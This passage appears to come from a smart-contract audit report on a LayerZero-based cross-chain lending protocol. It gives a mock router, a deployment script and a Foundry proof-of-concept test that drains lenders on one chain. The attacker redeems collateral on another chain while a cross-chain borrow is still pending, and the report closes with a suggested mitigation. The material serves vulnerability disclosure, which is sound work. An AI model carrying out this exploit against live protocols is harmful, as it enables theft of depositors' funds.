        MessagingFee memory, // messagingFee
        address payable // refundAddress
    ) internal returns (LZReceiveParams memory) {
        // Create mock Origin struct
        Origin memory origin = Origin({
            srcEid: uint32(block.chainid), // Use current chain ID
            sender: bytes32(uint256(uint160(msg.sender))), // Use msg.sender instead of address(this)
            nonce: 0
        });

        LZReceiveParams memory lzParams = LZReceiveParams({
            origin: origin,
            //guid: bytes32(0),
            payload: _payload
            //executor: address(0),
            //extraData: bytes("")
        });

        return lzParams;

        // Call _lzReceive directly on pair contract
        // pairContract._lzReceive(
        //     origin,
        //     bytes32(0), // guid
        //     _payload,
        //     address(0), // executor
        //     bytes("") // extraData
        // );
    }
}
```

`DeployAsync` :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {CrossChainRouter} from "../src/LayerZero/CrossChainRouter.sol";
import {Lendtroller} from "../src/Lendtroller.sol";
import {LendtrollerInterface} from "../src/LendtrollerInterface.sol";
import {SimplePriceOracle} from "../src/SimplePriceOracle.sol";
import {PriceOracle} from "../src/PriceOracle.sol";
import {WhitePaperInterestRateModel} from "../src/WhitePaperInterestRateModel.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {LErc20} from "../src/LErc20.sol";
import {LErc20Immutable} from "../src/LErc20Immutable.sol";
import {LEther} from "../src/LEther.sol";
import {LToken} from "../src/LToken.sol";
import {UniswapAnchoredView} from "../src/Uniswap/UniswapAnchoredView.sol";
import {UniswapConfig} from "../src/Uniswap/UniswapConfig.sol";
import {EndpointV2} from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import {CrossChainMockAsync} from "../test/poc/CrossChainMockAsync.sol";
import {CoreRouter} from "../src/LayerZero/CoreRouter.sol";
import {LendStorage} from "../src/LayerZero/LendStorage.sol";
import {PythOracle} from "../src/Pyth/PythOracle.sol";
import {ChainlinkOracle} from "../src/Chainlink/ChainlinkOracle.sol";
import {Lend} from "../src/Governance/Lend.sol";

/// @dev After running, to connect protocols, run ConnectProtocols.s.sol
contract DeployAsync is Script {
    HelperConfig public helperConfig;

    // Constants for interest rate model
    uint256 constant BASE_RATE = 0.1e18; // 10% base rate
    uint256 constant MULTIPLIER = 0.05e18; // 5% multiplier

    address[] lTokens;

    bool isMock;
    bytes32[] pythPriceIds;
    address[] chainlinkFeeds;
    // Get deployment configurations, but ignore the endpoint from config
    address configuredEndpoint;
    uint32 currentEid;

    address lendTokenAddress;

    address pythAddress;

    function run(address _endpoint)
        public
        returns (
            address priceOracleAddress,
            address lendtrollerAddress,
            address interestRateModelAddress,
            address[] memory lTokenAddresses,
            address payable crossChainRouterAddress,
            address payable coreRouterAddress,
            address lendStorageAddress,
            address layerZeroEndpoint,
            address[] memory supportedTokens
        )
    {
        helperConfig = new HelperConfig();

        (configuredEndpoint, supportedTokens, isMock, pythPriceIds, currentEid, pythAddress, chainlinkFeeds) =
            helperConfig.getActiveNetworkConfig();

        // Use the provided endpoint instead
        layerZeroEndpoint = _endpoint != address(0) ? _endpoint : configuredEndpoint;

        // Start broadcasting transactions
        vm.startBroadcast();

        // Deploy appropriate price oracle based on network type
        address priceOracle;
        if (isMock) {
            // Use SimplePriceOracle for testnets
            priceOracle = address(new SimplePriceOracle());
        } else {
            if (currentEid == 40264 || currentEid == 30266 || currentEid == 40349 || currentEid == 40362) {
                // Use PythOracle for Merlin Testnet / Mainnet, Sonic Testnet, and HyperEVM Testnet
                priceOracle = address(new PythOracle(pythAddress));
            } else {
                priceOracle = address(new ChainlinkOracle());
            }
        }

        // Next: deploy a lendtroller
        lendtrollerAddress = address(new Lendtroller());
        Lendtroller(lendtrollerAddress)._setPriceOracle(PriceOracle(priceOracle));
        Lendtroller(lendtrollerAddress)._setCloseFactor(0.5e18);

        // Next, deploy lend token
        lendTokenAddress = address(new Lend(lendtrollerAddress));
        Lendtroller(lendtrollerAddress).setLendToken(lendTokenAddress);

        // Note: If we want to make upgradable, we can deploy a Unitroller contract
        // and delegate calls to the lendtroller implementation

        // Then: deploy the interest rate model
        interestRateModelAddress = address(new WhitePaperInterestRateModel(BASE_RATE, MULTIPLIER));

        // Deploy lTokens for each supported token
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            if (supportedTokens[i] == address(0)) {
                // Deploy LEther for ETH (ETH has 18 decimals)
                // initialExchangeRate = 0.02 * 10^(18 + 18 - 8) = 2 * 10^26
                uint256 initialExchangeRate = 2e26;
                lTokens.push(
                    address(
                        new LEther(
                            LendtrollerInterface(lendtrollerAddress),
                            WhitePaperInterestRateModel(interestRateModelAddress),
                            initialExchangeRate,
                            "Lending Ether",
                            "lETH",
                            8,
                            payable(msg.sender)
                        )
                    )
                );
            } else {
                // Get decimals of underlying token
                // Calculate initial exchange rate based on underlying decimals
                // Formula: 0.02 * 10^(18 + underlying_decimals - 8)
                // We multiply by 16, so 2 == 0.01 (remove 2 decimal places from 18)
                uint256 initialExchangeRate = 2 * 10 ** (16 + IERC20Metadata(supportedTokens[i]).decimals() - 8);

                lTokens.push(
                    address(
                        new LErc20Immutable(
                            supportedTokens[i],
                            LendtrollerInterface(lendtrollerAddress),
                            WhitePaperInterestRateModel(interestRateModelAddress),
                            initialExchangeRate,
                            string(abi.encodePacked("Lending ", IERC20Metadata(supportedTokens[i]).name())),
                            string(abi.encodePacked("l", IERC20Metadata(supportedTokens[i]).symbol())),
                            8, // 8 decimals for lTokens
                            payable(msg.sender)
                        )
                    )
                );
            }

            if (isMock) {
                SimplePriceOracle(priceOracle).setDirectPrice(supportedTokens[i], 1e18);
            } else {
                // Sonic, Hype etc.
                if (currentEid == 40264 || currentEid == 30266 || currentEid == 40349 || currentEid == 40362) {
                    // Add price feed IDs for each token
                    PythOracle(priceOracle).addLTokenToPriceId(lTokens[i], pythPriceIds[i]);
                } else {
                    // Add l token to testnet oracle
                    ChainlinkOracle(priceOracle).addLTokenToFeed(lTokens[i], chainlinkFeeds[i]);
                }
            }

            // Support market in lendtroller
            Lendtroller(lendtrollerAddress)._supportMarket(LToken(lTokens[i]));

            // Set collateral factor (75%)
            Lendtroller(lendtrollerAddress)._setCollateralFactor(LToken(lTokens[i]), 0.75e18);

            // Set liquidation incentive (8%)
            Lendtroller(lendtrollerAddress)._setLiquidationIncentive(1.08e18);
        }

        address payable router;

        lendStorageAddress = address(new LendStorage(lendtrollerAddress, priceOracle, currentEid));

        coreRouterAddress = payable(address(new CoreRouter(lendStorageAddress, priceOracle, lendtrollerAddress)));

        if (isMock) {
            // Deploy a mock CrossChainRouter contract
            router = payable(
                address(
                    new CrossChainMockAsync(
                        lendStorageAddress, address(priceOracle), lendtrollerAddress, coreRouterAddress, currentEid
                    )
                )
            );
        } else {
            // Deploy the real CrossChainRouter contract
            router = payable(
                address(
                    new CrossChainRouter(
                        layerZeroEndpoint,
                        msg.sender,
                        lendStorageAddress,
                        priceOracle,
                        lendtrollerAddress,
                        coreRouterAddress,
                        currentEid
                    )
                )
            );
        }

        CoreRouter(coreRouterAddress).setCrossChainRouter(address(router));

        // Set authorized contracts
        LendStorage(lendStorageAddress).setAuthorizedContract(coreRouterAddress, true);
        LendStorage(lendStorageAddress).setAuthorizedContract(router, true);

        // Set the LendStorage address in the lendtroller
        Lendtroller(lendtrollerAddress).setLendStorage(lendStorageAddress);

        // Add supported tokens and their corresponding lTokens
        for (uint256 i = 0; i < supportedTokens.length; i++) {
            LendStorage(lendStorageAddress).addSupportedTokens(supportedTokens[i], lTokens[i]);
        }

        // After all markets have been supported and collateral factors set:
        for (uint256 i = 0; i < lTokens.length; i++) {
            LToken[] memory marketArray = new LToken[](1);
            marketArray[0] = LToken(lTokens[i]);

            uint256[] memory supplySpeeds = new uint256[](1);
            uint256[] memory borrowSpeeds = new uint256[](1);

            // For testing, set a small nonzero speed to confirm indexes advance:
            supplySpeeds[0] = 1e14; // Example: 0.0001 LEND per block to suppliers
            borrowSpeeds[0] = 1e14; // Example: 0.0001 LEND per block to borrowers

            Lendtroller(lendtrollerAddress)._setLendSpeeds(marketArray, supplySpeeds, borrowSpeeds);
        }

        vm.stopBroadcast();

        return (
            priceOracle,
            lendtrollerAddress,
            interestRateModelAddress,
            lTokens,
            router,
            coreRouterAddress,
            lendStorageAddress,
            layerZeroEndpoint,
            supportedTokens
        );
    }

    // Keep the original run() function for normal deployments
    function run()
        public
        returns (
            address priceOracleAddress,
            address lendtrollerAddress,
            address interestRateModelAddress,
            address[] memory lTokenAddresses,
            address payable routerAddress,
            address payable coreRouterAddress,
            address lendStorageAddress,
            address layerZeroEndpoint,
            address[] memory supportedTokens
        )
    {
        return run(address(0)); // Deploy will use config endpoint when 0 address is passed
    }
}
```

`TestDrainCrossChain` -- The Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console2, console} from "forge-std/Test.sol";
import {DeployAsync} from "../../script/DeployAsync.s.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {CrossChainMockAsync} from "./CrossChainMockAsync.sol";
import {CoreRouter} from "../../src/LayerZero/CoreRouter.sol";
import {LendStorage} from "../../src/LayerZero/LendStorage.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {Lendtroller} from "../../src/Lendtroller.sol";
import {InterestRateModel} from "../../src/InterestRateModel.sol";
import {SimplePriceOracle} from "../../src/SimplePriceOracle.sol";
import {LTokenInterface} from "../../src/LTokenInterfaces.sol";
import {LToken} from "../../src/LToken.sol";
import "@layerzerolabs/lz-evm-oapp-v2/test/TestHelper.sol";
import {SendLibMock} from "@layerzerolabs/lz-evm-messagelib-v2/test/mocks/SendLibMock.sol";
import "@layerzerolabs/lz-evm-protocol-v2/test/utils/LayerZeroTest.sol";


contract TestDrainCrossChain is LayerZeroTest {
    HelperConfig public helperConfig;
    address public layerZeroEndpoint;
    address[] public supportedTokensA;
    address[] public supportedTokensB;
    address[] public supportedTokensC;
    bool public isTestnet;

    address public deployer;
    address public attacker;
    address public lender;

    // Chain A (Source)
    CrossChainMockAsync public routerA;
    LendStorage public lendStorageA;
    CoreRouter public coreRouterA;
    Lendtroller public lendtrollerA;
    InterestRateModel public interestRateModelA;
    SimplePriceOracle public priceOracleA;
    address[] public lTokensA;

    // Chain B (Destination)
    CrossChainMockAsync public routerB;
    LendStorage public lendStorageB;
    CoreRouter public coreRouterB;
    Lendtroller public lendtrollerB;
    InterestRateModel public interestRateModelB;
    SimplePriceOracle public priceOracleB;
    address[] public lTokensB;

    uint32 constant CHAIN_A_ID = 1;
    uint32 constant CHAIN_B_ID = 2;

    EndpointV2 public endpointA;
    EndpointV2 public endpointB;
    SimpleMessageLib public simpleMsgLibA;
    SimpleMessageLib public simpleMsgLibB;

    // Events to test
    event BorrowSuccess(address indexed borrower, address indexed lToken, uint256 accountBorrow);

    function setUp() public override(LayerZeroTest) {
        super.setUp();

        deployer = makeAddr("deployer");
        vm.deal(deployer, 1000 ether);

        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        
        lender = makeAddr("lender");
        vm.deal(lender, 1 ether);

        // Deploy protocol on Chain A using the endpoint we just created
        DeployAsync deployA = new DeployAsync();
        (
            address priceOracleAddressA,
            address lendtrollerAddressA,
            address interestRateModelAddressA,
            address[] memory lTokenAddressesA,
            address payable routerAddressA,
            address payable coreRouterAddressA,
            address lendStorageAddressA,
            , //address _layerZeroEndpoint
            address[] memory _supportedTokensA
        ) = deployA.run(address(endpointA)); // Pass the endpoint address to Deploy.run

        // Store Chain A values
        routerA = CrossChainMockAsync(payable(routerAddressA));
        lendStorageA = LendStorage(lendStorageAddressA);
        coreRouterA = CoreRouter(coreRouterAddressA);
        lendtrollerA = Lendtroller(lendtrollerAddressA);
        interestRateModelA = InterestRateModel(interestRateModelAddressA);
        priceOracleA = SimplePriceOracle(priceOracleAddressA);
        lTokensA = lTokenAddressesA;
        supportedTokensA = _supportedTokensA;

        // Deploy protocol on Chain B
        DeployAsync deployB = new DeployAsync();
        (
            address priceOracleAddressB,
            address lendtrollerAddressB,
            address interestRateModelAddressB,
            address[] memory lTokenAddressesB,
            address payable routerAddressB,
            address payable coreRouterAddressB,
            address lendStorageAddressB,
            , // address _layerZeroEndpoint
            address[] memory _supportedTokensB
        ) = deployB.run(address(endpointB));

        // Store Chain B values
        routerB = CrossChainMockAsync(payable(routerAddressB));
        lendStorageB = LendStorage(lendStorageAddressB);
        coreRouterB = CoreRouter(coreRouterAddressB);
        lendtrollerB = Lendtroller(lendtrollerAddressB);
        interestRateModelB = InterestRateModel(interestRateModelAddressB);
        priceOracleB = SimplePriceOracle(priceOracleAddressB);
        lTokensB = lTokenAddressesB;
        supportedTokensB = _supportedTokensB;

        // Now set up cross-chain mappings as the owner
        vm.startPrank(routerA.owner());
        for (uint256 i = 0; i < supportedTokensA.length; i++) {
            lendStorageA.addUnderlyingToDestUnderlying(supportedTokensA[i], supportedTokensB[i], CHAIN_B_ID);
            // Add mapping from underlying token to destination lToken
            lendStorageA.addUnderlyingToDestlToken(supportedTokensA[i], lTokensB[i], CHAIN_B_ID);
        }
        vm.stopPrank();

        vm.startPrank(routerB.owner());
        for (uint256 i = 0; i < supportedTokensB.length; i++) {
            lendStorageB.addUnderlyingToDestUnderlying(supportedTokensB[i], supportedTokensA[i], CHAIN_A_ID);
            // Add mapping from underlying token to destination lToken
            lendStorageB.addUnderlyingToDestlToken(supportedTokensB[i], lTokensA[i], CHAIN_A_ID);
        }
        vm.stopPrank();

        // Set up initial prices for supported tokens on both chains

        for (uint256 i = 0; i < supportedTokensA.length; i++) {
            priceOracleA.setDirectPrice(supportedTokensA[i], 1e18);
        }

        for (uint256 i = 0; i < supportedTokensB.length; i++) {
            priceOracleB.setDirectPrice(supportedTokensB[i], 1e18);
        }

        vm.label(address(routerA), "Router A");
        vm.label(address(routerB), "Router B");
        // After deploying routers, set up their pair contracts
        routerA = CrossChainMockAsync(payable(routerAddressA));
        routerB = CrossChainMockAsync(payable(routerAddressB));

        // Set up pair relationships
        routerA.setPairContract(payable(address(routerB)));
        routerB.setPairContract(payable(address(routerA)));
    }

    // Helper function to supply tokens before testing borrowing
    function _supplyA(uint256 amount) internal returns (address token, address lToken) {
        // Deal ether for LayerZero fees
        vm.deal(address(routerA), 1 ether);

        token = supportedTokensA[0];
        lToken = lendStorageA.underlyingTolToken(token);

        vm.startPrank(attacker);
        ERC20Mock(token).mint(attacker, amount);
        IERC20(token).approve(address(coreRouterA), amount);
        coreRouterA.supply(amount, token);
        vm.stopPrank();
    }

    function _supplyB(uint256 amount) internal returns (address token, address lToken) {
        // Deal ether for LayerZero fees
        vm.deal(address(routerB), 1 ether);

        token = supportedTokensB[0];
        lToken = lendStorageB.underlyingTolToken(token);

        vm.startPrank(lender);
        ERC20Mock(token).mint(lender, amount);
        IERC20(token).approve(address(coreRouterB), amount);
        coreRouterB.supply(amount, token);
        vm.stopPrank();
    }

    function test_cross_chain_drain() public {
        //Attacker Supplies on Chain A
        (address tokenA, address lTokenA) = _supplyA(100 ether);
        console.log("Address Token A: ", tokenA);
        console.log("Address lToken A: ", lTokenA);
        uint256 totalSuppliedAttackerA = lendStorageA.getTotalSupplied(attacker, lTokenA);
        console.log("Total Token A Supplied by Attacker on A before borrow: ", totalSuppliedAttackerA);

        //Lender Supplies on Chain B
        (address tokenB, address lTokenB) = _supplyB(90 ether);
        console.log("Address Token B: ", tokenB);
        console.log("Address lToken B: ", lTokenB);
        uint256 totalSuppliedLenderB = lendStorageB.getTotalSupplied(lender, lTokenB);
        console.log("Total Token B Supplied by Lender on B before borrow: ", totalSuppliedLenderB);

        //Attacker Requests Cross Chain Borrow on B from Chain A (get LZReceiveParams here)
        vm.startPrank(attacker);
        console.log("Attacker Token A balance before redeem: ", ERC20Mock(tokenA).balanceOf(attacker));
        address destToken = lendStorageA.underlyingToDestUnderlying(tokenA, CHAIN_B_ID);
        console.log("Destination token borrow (should be tokenB): ", destToken);
        uint256 maxBorrow = (lendStorageA.getMaxBorrowAmount(attacker, lTokenA) * 0.9e18) / 1e18;
        CrossChainMockAsync.LZReceiveParams memory lzReceiveParamsStep1 = routerA.borrowCrossChain(maxBorrow, tokenA, CHAIN_B_ID);


        //Attacker Redeems Collateral on Chain A
        uint256 lTokenBalanceToRedeem = lendStorageA.totalInvestment(attacker, lTokenA);
        coreRouterA.redeem(lTokenBalanceToRedeem, payable(lTokenA));
        uint256 attackerBalanceAfterRedeem = ERC20Mock(tokenA).balanceOf(attacker);
        console.log("Attacker Token A Balance After Redeem: ", attackerBalanceAfterRedeem);
        vm.stopPrank();

        //LzReceive is called on Chain B (LZReceive Params provided and received again)
        vm.startPrank(deployer);
        CrossChainMockAsync.LZReceiveParams memory lzReceiveParamsBorrowConfirm = routerB._lzReceive(lzReceiveParamsStep1.origin, bytes32(0), lzReceiveParamsStep1.payload, address(0), bytes(""));
        console.log("Attacker Token B Balance After Borrow is Confirmed: ", ERC20Mock(tokenB).balanceOf(attacker));


        //LzReceive is called on Chain A to finalize the borrow
        routerA._lzReceive(lzReceiveParamsBorrowConfirm.origin, bytes32(0), lzReceiveParamsBorrowConfirm.payload, address(0), bytes(""));
    }
}
```

### Mitigation

`CrossChainRouter::borrowCrossChain` should communicate with `LendStorage` to lock redemptions for borrowers until a cross chain borrow request has been completed (successfully or unsuccessfully). 

There are a few ways to do this, either by a lock variable, or adding a mapping that tracks `pendingBorrowAmount` and that is added to the borrow calculation when requesting a redemption.